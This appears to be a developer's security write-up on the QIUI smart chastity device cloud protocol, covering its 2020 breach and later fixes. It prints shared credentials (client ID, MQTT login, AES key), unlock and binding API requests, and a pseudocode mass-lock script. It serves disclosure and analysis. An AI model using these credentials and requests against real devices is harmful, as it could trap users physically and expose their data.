# QIUI Cloud Protocol (Original & Current)

How the original QIUI cloud service authenticates users, identifies devices, and sends commands — and what they did (and didn't) fix after the widely-reported 2020 breach that left users locked in their devices.

## Overview

```
┌──────────┐         ┌──────────────────┐         ┌──────────┐
│  Mobile   │◄──────►│   QIUI Cloud     │◄──MQTT──►│  Device  │
│   App     │  HTTPS  │  openapi.qiuitoy │          │  (BLE/4G)│
└──────────┘         └──────────────────┘         └──────────┘
     │                                                  ▲
     └──────────────── BLE ────────────────────────────┘
```

All intelligence lives in the cloud. The app is a relay — it asks the cloud for hex command bytes, then writes them to the BLE device. The device itself has no concept of who is sending commands.

## Authentication

### Step 1: Get Platform Token

```
POST /system/api/device/common/getPlatformApiToken

{
  "clientId": "Client_35115347524B4D1CA9A20BF2F660EF49",
  "grantType": "client_credentials"
}

Response:
{
  "code": 200,
  "data": {
    "platformApiToken": "eyJhbGciOiJIUzUxMiJ9...",
    "expiresTime": 43193
  }
}
```

**Problem:** The Client ID is hardcoded in every copy of the app. It's not a secret — it's the same string for every user worldwide. Anyone who decompiles the APK (or reads the open-source sample) has it. The "authentication" is essentially:

```
┌─────────┐                    ┌─────────────┐
│ Attacker │───── Same ────────►│ QIUI Cloud  │
│          │   Client ID as     │             │
│          │   every other app  │  "Welcome!" │
└─────────┘                    └─────────────┘
```

There is **no per-user authentication**. No username, no password, no account. The platform token grants access to device operations for **any** device.

### Step 2: Get Device Token

```
POST /system/api/device/common/getDeviceToken
Authorization: {platformApiToken}

{
  "bluetoothAddress": "17:DA:45:7D:A9:11",
  "serialNumber": "QIUIwwnnk1234567",
  "typeId": 6
}

Response:
{
  "code": 200,
  "data": "6612C16C7D600088AC8ACA4BA5350281"
}
```

The device token is a hex string used in BLE command construction. It's fetched per-device but there's no verification that the requesting user owns the device.

## Device Identification

Devices are identified by:

| Field | Example | Entropy |
|-------|---------|---------|
| MAC Address | `17:DA:45:7D:A9:11` | 48 bits (but BLE MACs are often sequential from manufacturing) |
| Serial Number | `QIUIwwnnk1234567` | Predictable prefix + sequential digits |
| Type ID | `6` | Single digit (6 = KeyPod, 10 = CellMate Pro, 13 = Metal) |
| Cloud Device ID | `26` | **Sequential integer** |

The cloud assigns device IDs as sequential integers. Device #26 was registered after #25. This means:

```
Device IDs:  1, 2, 3, 4, 5, 6, ... 26, 27, 28 ...
                 ▲
                 │
          Simply increment to find the next device
```

**There is no authorization check** — if you know (or guess) a device's MAC address or cloud ID, you can query it, bind it, and send commands to it.

## Pairing (Device Binding)

```
POST /system/api/platform/device/addDeviceInfo
Authorization: {platformApiToken}

{
  "bluetoothAddress": "17:DA:45:7D:A9:11"
}

Response:
{
  "code": 200,
  "data": {
    "id": 26,
    "userId": 107,
    "bluetoothAddress": "17:DA:45:7D:A9:11",
    "serialNumber": "QIUIwwnnk1234567",
    "typeId": 6
  }
}
```

**There is no pairing code.** No out-of-band verification. No consent from the device owner. If you know a MAC address, you can bind the device to yourself. The cloud assigns you a `userId` and links it to the device.

```
Attacker knows MAC ──► addDeviceInfo ──► Cloud says "OK, it's yours now"
                                              │
                                              ▼
                                         No notification
                                         to actual owner
```

## Command Flow

### BLE Path (Local Proximity)

```
┌─────────┐    1. Request cmd hex     ┌──────────┐
│   App    │─────────────────────────►│  Cloud   │
│          │◄─────────────────────────│          │
│          │    2. Hex command bytes   │          │
│          │                          └──────────┘
│          │    3. BLE Write
│          │─────────────────────────►┌──────────┐
│          │◄─────────────────────────│  Device  │
│          │    4. BLE Notify (enc)   └──────────┘
│          │
│          │    5. Decrypt via cloud
│          │─────────────────────────►┌──────────┐
│          │◄─────────────────────────│  Cloud   │
└─────────┘    6. Decrypted result    └──────────┘
```

### 4G Path (Remote)

```
┌─────────┐    1. Send cmd via API    ┌──────────┐    2. MQTT     ┌──────────┐
│   App    │─────────────────────────►│  Cloud   │──────────────►│  Device  │
└─────────┘                          └──────────┘               └──────────┘
```

For 4G-equipped devices, the cloud sends the command over MQTT. The app doesn't need BLE proximity at all — commands go: App → Cloud → MQTT → Device.

### Example: Unlock Command

```
POST /system/api/device/keyPod/getKeyPodUnlockCmd
Authorization: {platformApiToken}

{
  "bluetoothAddress": "17:DA:45:7D:A9:11",
  "serialNumber": "QIUIwwnnk1234567",
  "typeId": 6
}

Response:
{
  "code": 200,
  "data": "AB12CD34EF567890..."
}
```

**No signing. No nonces. No replay protection.** If you capture a command, you can replay it. The hex bytes are the same every time for the same operation.

## MQTT

```
Broker:    tcp://openmq.qiuitoy.com:1883
Username:  mqtt_usr_7253ae60
Password:  mqtt_pwd_65abd826
Topic:     device\Client_35115347524B4D1CA9A20BF2F660EF49
```

**The MQTT credentials are hardcoded and shared by every app instance.** Anyone can connect and subscribe to the device status topic for ALL devices.

MQTT messages contain:
```json
{
  "serialNumber": "QIUIwwnnk1234567",
  "mqttType": "mqtt_h00001",
  "cmdStatus": "0",
  "bluetoothAddress": "17:DA:45:7D:A9:11",
  "onlineStatus": "online",
  "battery": "85"
}
```

By subscribing to the shared topic, an attacker can enumerate every online device, learn their MAC addresses, serial numbers, battery levels, and online status — **in real time**.

## Encryption (Disabled)

The codebase contains AES-128-CBC encryption/decryption functions with:

```
Key: C8BE5C77E0104378ABBEF7DA6FBF7408
IV:  0123456789abcdef
```

However, **both functions are commented out** — they return the input unchanged:

```java
public static String encrypt(String content) throws Exception {
    // Cipher cipher = ...
    // 去掉加密 (encryption removed)
    return content;
}
```

All API traffic is sent as plaintext JSON over HTTPS. The AES layer was designed but never activated.

## The Attack Surface

```
┌─────────────────────────────────────────────────────────────┐
│                    QIUI CLOUD ATTACK SURFACE                │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Hardcoded Client ID      → Anyone can get a token       │
│  2. No per-user auth         → No accounts, no passwords    │
│  3. Sequential device IDs    → Enumerate all devices         │
│  4. No ownership verification→ Bind any device by MAC       │
│  5. Shared MQTT credentials  → Monitor all devices globally │
│  6. No command signing       → Forge commands freely         │
│  7. No replay protection     → Replay captured commands     │
│  8. Encryption disabled      → All traffic is plaintext     │
│  9. No rate limiting         → Automate at scale            │
│ 10. Predictable serials      → Guess device identifiers     │
│                                                             │
│  Attack cost: ~30 lines of Python                           │
│  Affected devices: ALL of them                              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Mass Lock Attack (What Actually Happened)

```python
# Pseudocode of the actual attack
token = get_platform_token("Client_35115347524B4D1CA9A20BF2F660EF49")

for device_id in range(1, 100000):    # Sequential IDs
    info = query_device(token, device_id)
    if info:
        lock_command(token, info.mac, info.serial, info.type_id)
        print(f"Locked device {device_id}: {info.mac}")
```

This script could lock every QIUI device in existence. There was nothing to stop it — no authentication, no rate limiting, no ownership checks, no signing.

## Timeline

| Event | What Happened |
|-------|--------------|
| Device manufactured | Sequential serial number assigned |
| User buys device | Scans BLE, cloud assigns sequential device ID |
| User "binds" device | MAC address → cloud, no verification |
| Attacker enumerates | Increment device IDs, collect MACs from MQTT |
| Attacker locks devices | Send lock commands for every device found |
| Users locked in | No way to unlock without BLE proximity + working cloud |
| Cloud goes down | Physical lockout — users resort to screwdrivers and bolt cutters |

---

## How QIUI Tried to Fix It

### Disclosure Timeline

| Date | Event |
|------|-------|
| Apr 2020 | [Pen Test Partners](https://www.pentestpartners.com/security-blog/smart-male-chastity-lock-cock-up/) discovers vulnerabilities, contacts QIUI |
| Apr–Sep 2020 | QIUI misses three self-imposed remediation deadlines, then stops responding |
| Jun 2020 | QIUI quietly deploys API v2 to app stores — no communication to researchers |
| Oct 6, 2020 | Pen Test Partners publishes full disclosure alongside multiple researchers |
| Oct 2020 | QIUI issues emergency override, unlocking all devices via the cloud |
| Late 2020 | [ChastityLock ransomware](https://www.bleepingcomputer.com/news/security/hacker-used-ransomware-to-lock-victims-in-their-iot-chastity-belt/) appears — attacker locks devices and demands 0.02 BTC (~$270) per victim |
| 2021+ | QIUI develops app v3.0 with further security changes |

### API v2 (June 2020) — The Botched Fix

QIUI's first fix was to deploy a new version of the API that required authentication on most endpoints. But they made a critical mistake: **they left API v1 running alongside v2.**

```
                    ┌──────────────────────────┐
                    │       QIUI Servers        │
                    │                           │
Attacker ──────────►│  /api/v1/  (NO AUTH)  ◄── still running!
                    │                           │
Legitimate app ───►│  /api/v2/  (with auth)    │
                    │                           │
                    └──────────────────────────┘

    v2 added authentication, but v1 was never shut down.
    Every vulnerability remained exploitable through v1.
```

Other problems with the v2 fix:

- **GPS locations still exposed** — the new API still returned exact user coordinates
- **No rate limiting added** — automated enumeration still possible
- **Friend code leak** — the 6-digit friend code system leaked user data (usernames, phone numbers, plaintext passwords, GPS coordinates, and the longer `memberCode` used for full API access)

```
GET /list?memberCode=20200409xxxxxxxx         ← Enumerate all devices
GET /wear?memberCode=...&deviceCode=...       ← Check permissions
POST /binding  memberCode=...&deviceCode=...  ← Hijack any device
```

The `memberCode` format (`20200409xxxxxxxx`) was based on registration date plus a short suffix — **predictable and enumerable**.

### API v3 / App v3.0 (2021+) — The Current State

QIUI eventually developed version 3 of their app and API, and released the "Open Platform" API for third-party developers. This is the version documented in their [public sample code](https://github.com/nicjay/QIUI-API) and what our KeyMaster app uses for BLE command generation.

**What changed in the Open Platform API:**

```
┌─────────────────────────────────────────────────────────┐
│              OPEN PLATFORM API (Current)                  │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  Base URL: https://openapi.qiuitoy.com                   │
│  Auth:     client_credentials → platformApiToken (JWT)   │
│  Header:   Authorization: {platformApiToken}             │
│            Environment: TEST                             │
│                                                          │
│  Flow:                                                   │
│    1. getPlatformApiToken (hardcoded ClientId)           │
│    2. queryDeviceInfo / addDeviceInfo (by MAC)           │
│    3. getDeviceToken (returns hex command token)         │
│    4. get*Cmd endpoints (returns BLE hex commands)       │
│    5. Write hex to BLE device locally                    │
│    6. decryBluetoothCommand (decrypt device response)    │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

**What's better:**

| Improvement | Details |
|-------------|---------|
| JWT tokens | API now uses JWT (HS512) instead of raw memberCodes |
| User data not in API responses | Device queries no longer return passwords, phone numbers, or GPS |
| Separate Open Platform | Third-party access uses `openapi.qiuitoy.com` instead of the user-facing API |
| AES encryption scaffolding | Code contains AES-128-CBC with key/IV (though still disabled in reference code) |

**What's still fundamentally broken:**

| Problem | Why it matters |
|---------|---------------|
| **Hardcoded Client ID** | `Client_35115347524B4D1CA9A20BF2F660EF49` is the same for every app instance. It's not a user secret — it's in the open-source sample code. Anyone can get a valid platform token. |
| **No per-user authentication** | The Open Platform API uses `client_credentials` grant. There are no usernames, passwords, or individual accounts. The platform token works for any device. |
| **MAC = identity** | Device operations still key on Bluetooth MAC address. Know the MAC → query the device → get command tokens. No ownership check. |
| **No command signing** | Commands are not signed. The cloud generates hex bytes; anyone with a platform token can request them. |
| **No replay protection** | No nonces. Request the same unlock command twice, get the same hex bytes. |
| **No rate limiting** | Nothing prevents automated enumeration of devices by MAC address. |
| **Shared MQTT** | Same broker, same credentials (`mqtt_usr_7253ae60` / `mqtt_pwd_65abd826`), same topic. Every app instance can monitor every device. |
| **Encryption still disabled** | `EncryptUtil.encrypt()` and `decrypt()` are no-ops. The AES key (`C8BE...7408`) and IV (`0123456789abcdef`) exist in code but the functions return their input unchanged. |
| **Environment: TEST** | Every request from the open-source sample code sends `Environment: TEST`. It's unclear if a production environment exists with different security, but this is what third-party developers are given. |

### The Core Design Problem

QIUI's fundamental architecture hasn't changed. The cloud is still the authority on everything — it generates the BLE command bytes, it holds the device tokens, it brokers all communication. The device still has no concept of who is controlling it.

```
                  QIUI Architecture (Then and Now)
                  ================================

    "Who can control this device?"

    v1 (2020):   Anyone.
    v2 (2020):   Anyone with the same shared Client ID.
    v3 (2021+):  Anyone with the same shared Client ID.
                 (But now with a JWT wrapper around it.)
```

The JWT in v3 is a **cosmetic improvement**. It adds a token exchange step, but since the Client ID is hardcoded and shared, and there's no per-user identity, the token is functionally equivalent to the old unauthenticated access — just with an extra HTTP request.

```
v1:  GET /device?mac=AA:BB:CC:DD:EE:FF                    ← No auth at all
v3:  POST /getPlatformApiToken {clientId: "Client_..."}    ← Get shared token
     POST /queryDeviceInfo {mac: "AA:BB:CC:DD:EE:FF"}      ← Same result
          Authorization: {shared_token}
```

### QIUI's Official Position

In their [blog post](https://www.qiui.store/blogs/news/case-solved-cellmate-chastity-hacked), QIUI states:

> *"Proper security encryption had been enforced to protect users and prevent any similar incident from happening in the future."*

> *"There had not been a recurrence of such incident ever since October 2020."*

They provided a third-party security test report claiming the v3.0 app is safe. However, they disclosed no technical details about what specifically changed, and the open-source reference code — their public face to third-party developers — still exhibits all the fundamental design flaws.

The absence of repeat incidents likely reflects attackers' disinterest rather than improved security. The [ChastityLock ransomware](https://www.bleepingcomputer.com/news/security/hacker-used-ransomware-to-lock-victims-in-their-iot-chastity-belt/) in late 2020 demonstrated that real exploitation was trivial. The vulnerabilities remain — they're just not being actively exploited at the moment.

Sources:
- [Pen Test Partners — Smart male chastity lock cock-up](https://www.pentestpartners.com/security-blog/smart-male-chastity-lock-cock-up/)
- [Internet of Dongs — Locked In An Insecure Cage](https://internetofdon.gs/qiui-chastity-cage/)
- [TechCrunch — Security flaw left 'smart' chastity sex toy users at risk of permanent lock-in](https://techcrunch.com/2020/10/06/qiui-smart-chastity-sex-toy-security-flaw/)
- [BleepingComputer — Hacker used ransomware to lock victims in their IoT chastity belt](https://www.bleepingcomputer.com/news/security/hacker-used-ransomware-to-lock-victims-in-their-iot-chastity-belt/)
- [QIUI — Case Solved: Cellmate Chastity "Hacked"](https://www.qiui.store/blogs/news/case-solved-cellmate-chastity-hacked)
- [Mozilla Foundation — Qiui Cellmate Privacy & Security Guide](https://www.mozillafoundation.org/en/privacynotincluded/qiui-cellmate/)
